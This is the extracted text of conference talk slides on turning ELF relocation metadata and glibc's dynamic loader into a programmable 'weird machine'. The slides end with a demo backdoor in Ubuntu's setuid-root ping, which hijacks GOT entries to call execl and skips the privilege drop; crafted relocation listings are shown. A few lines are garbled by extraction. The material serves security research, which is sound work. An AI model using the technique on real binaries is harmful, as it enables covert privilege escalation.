 consider_profiling);
         ...
  l = l->l_prev;
}
      while (l);
TODO:
- set l->l_prev = l 
Unconditional Branches
 How relocation entries get processed
void
_dl_relocate_object (struct link_map *l, struct r_scope_elem *scope[],
     int reloc_mode, int consider_profiling)
{
  if (l->l_relocated)
    return;
  …
    ELF_DYNAMIC_RELOCATE (l, lazy, consider_profiling);
  …
  /* Mark the object so we know this work has been done.  */
  l->l_relocated = 1;
  ...
  /* In case we can protect the data now that the relocations are
     done, do it.  */
  if (l->l_relro_size != 0)
    _dl_protect_relro (l);
  ...
}
TODO:
- set l->l_prev = l  
•- fix l->l_relocated
Unconditional Branches
 How relocation entries get processed
void
_dl_relocate_object (struct link_map *l, struct r_scope_elem *scope[],
     int reloc_mode, int consider_profiling)
{
  if (l->l_relocated)
    return;
  …
    ELF_DYNAMIC_RELOCATE (l, lazy, consider_profiling);
  …
  /* Mark the object so we know this work has been done.  */
  l->l_relocated = 1;
  ...
  /* In case we can protect the data now that the relocations are
     done, do it.  */
  if (l->l_relro_size != 0)
    _dl_protect_relro (l);
  ...
}
TODO:
- set l->l_prev = l  
•- fix l->l_relocated
•- set l->l_relro_size = 0
Unconditional Branches
 How relocation entries get processed
      do
{
  struct libname_list *lnp = l->l_libname->next;
  while (__builtin_expect (lnp != NULL, 0))
    {
      lnp->dont_free = 1;
      lnp = lnp->next;
    }
  if (l != &GL(dl_rtld_map))
    _dl_relocate_object (l, l->l_scope, GLRO(dl_lazy) ? RTLD_LAZY : 0,
 consider_profiling);
         ...
  l = l->l_prev;
}
      while (l);
TODO:
- set l->l_prev = l  
•- fix l->l_relocated
•- set l->l_relro_size = 0
Unconditional Branching:
Todo-List
 Fix l->l_relocated
 Set l->l_prev = l
 Set l->l_relro_size = 0
 Set l->l_info[DT_RELA] = &next rel to process
 Fix l->l_info[DT_RELASZ]
Unconditional Branching:
Todo-List
 Fix l->l_relocated
 {offset =&(l->l_buckets), type = RELATIVE, addend=0}
 {offset =&(l->l_direct_opencount), type = RELATIVE, 
addend=0}
 {offset =&(l->l_libname->next), type = RELATIVE, 
addend=&(l->l_relocated) + 4*sizeof(int)}
 Set l->l_prev = l
 {offset =&(l->l_prev), type = RELATIVE, addend=&l}
 Set l->l_relro_size = 0
 (etc)
 Set l->l_info[DT_RELA] = &next rel to process
 Fix l->l_info[DT_RELASZ]
Unconditional Branching:
Skiping remaining relocation entries
 end is stored on stack, set end to 0 for branch
  for (; r r_info)] & 0x7fff;
      elf_machine_rel (map, r, &symtab[ELFW(R_SYM) (r->r_info)],
       &map->l_versions[ndx],
       (void *) (l_addr + r->r_offset));
    }
{offset =&end, type = RELATIVE, addend=0}
Conditional Branches
 Perform all branch bookkeeping
 IFUNC symbol only processed as function if 
st_shndx != 0
(empty)
Original dynsym 0
Original dynsym 1
...
Original dynsym n
Address tape head is pointing at
Copy of tape head's value
Address of previous sym's value
IFUNC of gadget that returns 0
.dynsym table
           typedef struct {
               uint32_t      st_name;
               unsigned char st_info;
               unsigned char st_other;
               uint16_t      st_shndx;
               Elf64_Addr    st_value;
               uint64_t      st_size;
           } Elf64_Sym;
Image: “Tree” Hernan D. Schlosman, from The Noun Project
Conditional Branches
setifunc = {offset=&(ifunc.shndx), type = COPY, sym=valptr}
update = {offset=&end, type = 64, sym=ifunc}
0x01
t_val
0 1
valptr
0 &t_val.value
ifunc
1 &return0
0xb33f0000
xxxxxxxx
end
shndx
Conditional Branches
setifunc = {offset=&(ifunc.shndx), type = COPY, sym=valptr}
update = {offset=&end, type = 64, sym=ifunc}
0x01
t_val
0 1
valptr
0 &t_val.value
ifunc
1 &return0
0xb33f0000
0
end
shndx
return0() called!
If (shndx == 0) then end = &return0
ELF Brainfuck ']'
 (The easier of the two)
 ”Jump backward to the matching [ unless the 
byte at the pointer is 0”
 Prepare for branch, set branch location to & of 
relocation entry after '['
 Set DT_RELA (dynamic table)
 If tapevalue == 0, then end = &return0
 continues processing (&return > &rela entries)
 If tapevalue != zero, then end = 0
 Stops processing relocaiton entries, branch 
executes (0 l_next->l_addr:
 Store &GOT+8 in a symbol
Relocation entries:
Symbols:
symgot = {value:&GOT+8, size: 8, ...}
 Use the following relocation entries with that 
symbol
get_exec_linkmap = {offset=&(symgot.value), type = COPY, sym=0}
get_l_next = {offset=&(symgot.value), type = 64, sym=0, addend=0x18}
deref_l_next = {offset=&(symgot.value), type = COPY, sym=0}
get_l_addr = {offset=&(symgot.value), type = COPY, sym=0}
symgot = {value:&got_0x8, size: 8, ...}
get_exec_linkmap
&got+0x8
Traversing link_map Structures
get_exec_linkmap = {offset=&(symgot.value), type = COPY, sym=0}
get_l_next = {offset=&(symgot.value), type = 64, sym=0, addend=0x18}
deref_l_next = {offset=&(symgot.value), type = COPY, sym=0}
get_l_addr = {offset=&(symgot.value), type = COPY, sym=0}
symgot = {value:&got_0x8, size: 8, ...}
get_exec_linkmap
&got+0x8
Traversing link_map Structures
get_exec_linkmap = {offset=&(symgot.value), type = COPY, sym=0}
get_l_next = {offset=&(symgot.value), type = 64, sym=0, addend=0x18}
deref_l_next = {offset=&(symgot.value), type = COPY, sym=0}
get_l_addr = {offset=&(symgot.value), type = COPY, sym=0}
symgot = {value:&got_0x8, size: 8, ...}
get_exec_linkmap
&linkmap
write
Traversing link_map Structures
get_exec_linkmap = {offset=&(symgot.value), type = COPY, sym=0}
get_l_next={offset=&(symgot.value),type = 64,sym=0, addend=0x18}
deref_l_next = {offset=&(symgot.value), type = COPY, sym=0}
get_l_addr = {offset=&(symgot.value), type = COPY, sym=0}
symgot = {value:&got_0x8, size: 8, ...}
get_l_next
&linkmap
calculate
Traversing link_map Structures
get_exec_linkmap = {offset=&(symgot.value), type = COPY, sym=0}
get_l_next={offset=&(symgot.value),type = 64,sym=0, addend=0x18}
deref_l_next = {offset=&(symgot.value), type = COPY, sym=0}
get_l_addr = {offset=&(symgot.value), type = COPY, sym=0}
symgot = {value:&got_0x8, size: 8, ...}
get_l_next
&linkmap->l_next
write
Traversing link_map Structures
get_exec_linkmap = {offset=&(symgot.value), type = COPY, sym=0}
get_l_next = {offset=&(symgot.value), type = 64, sym=0, addend=0x18}
deref_l_next = {offset=&(symgot.value), type = COPY, sym=0}
get_l_addr = {offset=&(symgot.value), type = COPY, sym=0}
symgot = {value:&got_0x8, size: 8, ...}
deref_l_next
&l_next
calculate
Traversing link_map Structures
get_exec_linkmap = {offset=&(symgot.value), type = COPY, sym=0}
get_l_next = {offset=&(symgot.value), type = 64, sym=0, addend=0x18}
deref_l_next = {offset=&(symgot.value), type = COPY, sym=0}
get_l_addr = {offset=&(symgot.value), type = COPY, sym=0}
symgot = {value:&got_0x8, size: 8, ...}
deref_l_next
l_next
write
Traversing link_map Structures
get_exec_linkmap = {offset=&(symgot.value), type = COPY, sym=0}
get_l_next = {offset=&(symgot.value), type = 64, sym=0, addend=0x18}
deref_l_next = {offset=&(symgot.value), type = COPY, sym=0}
get_l_addr = {offset=&(symgot.value), type = COPY, sym=0}
symgot = {value:&got_0x8, size: 8, ...}
deref_l_next
l_next
write
Traversing link_map Structures
get_exec_linkmap = {offset=&(symgot.value), type = COPY, sym=0}
get_l_next = {offset=&(symgot.value), type = 64, sym=0, addend=0x18}
deref_l_next = {offset=&(symgot.value), type = COPY, sym=0}
get_l_addr = {offset=&(symgot.value), type = COPY, sym=0}
symgot = {value:&got_0x8, size: 8, ...}
get_l_addr
l_next
calculate
Traversing link_map Structures
get_exec_linkmap = {offset=&(symgot.value), type = COPY, sym=0}
get_l_next = {offset=&(symgot.value), type = 64, sym=0, addend=0x18}
deref_l_next = {offset=&(symgot.value), type = COPY, sym=0}
get_l_addr = {offset=&(symgot.value), type = COPY, sym=0}
symgot = {value:&got_0x8, size: 8, ...}
get_l_addr
l_addr
write
symgot's value is now l->l_next->l_addr –-
base address of where ELF object is loaded
Traversing link_map Structures
Demo Exploit
 Built backdoor into Ubuntu's inetutils v1.8 ping
 Ping runs suid as root
 Given ”-t ” 
   Usage: -t, --type=TYPE  send TYPE packets
   Code: if(strcasecmp (, "echo") == 0) ...
 Goals:
 Redirect call to strcasecmp to execl
 Prevent call to setuid that drops root privledges
 Work in presence of library randomization (ASLR)
Image: “Remote Control”  by Simon Child and ”Television” by  Piero borgo from The Noun Project
Demo Exploit
 Goals:
 Redirect call to strcasecmp to execl
 Set strcasecmp's GOT entry to &execl
 Prevent privlege drop
 Set setuid's GOT entry to & retq instructios
 Lookup offset to execl and a retq instruction in 
glibc during metadata crafting time
 Find base address of glibc @ runtime
 Use link_map traversal trick! 
 The rest is easy peasy
Demo Exploit's Crafted Metadata
Symbol table '.sym.p' contains 90 entries:
   Num:    Value          Size Type    Bind   Vis      Ndx Name
     0: 000000000060dff0     8 FUNC    LOCAL  DEFAULT  UND
Relocation section '.rela.p' at offset 0xf3a8 contains 14 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend                                         
00000060dfe0  002d00000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0
00000060e9e0  004e00000005 R_X86_64_COPY     000000000060e9e0 __progname + 0
00000060e9f0  004b00000005 R_X86_64_COPY     000000000060e9f0 stdout + 0
00000060e9f8  005100000005 R_X86_64_COPY     000000000060e9f8 __progname_full + 0
00000060ea00  005600000005 R_X86_64_COPY     000000000060ea00 stderr + 0
00000060eb40  000000000005 R_X86_64_COPY                        0000000000000000
00000060eb40  000000000001 R_X86_64_64                          0000000000000018
00000060eb40  000000000005 R_X86_64_COPY                        0000000000000000
00000060eb40  000000000001 R_X86_64_64                          0000000000000018
00000060eb40  000000000005 R_X86_64_COPY                        0000000000000000
00000060eb40  000000000005 R_X86_64_COPY                        0000000000000000
00000060eb40  000000000001 R_X86_64_64                          00000000000be6e0
00000060e028  000000000001 R_X86_64_64                          0000000000000000
00000060e218  000000000008 R_X86_64_RELATIVE                    0000000000401dc2
Image: ”Knitting Needles”  by Connor Cesa and ”Yarn” by Marie Coons and ”Sweater” by Maurizio Fusillo from The Noun Project
(this slide intentionaly left blank)
(demo)
Thanks!
 Sergey Bratus
 Sean Smith
Inspirations:
 The grugq
 ERESI and Elfsh folks
 Mayhem
 Skape 
Also: thanks to the Noun Project for many of the excellent graphics
b
Questions?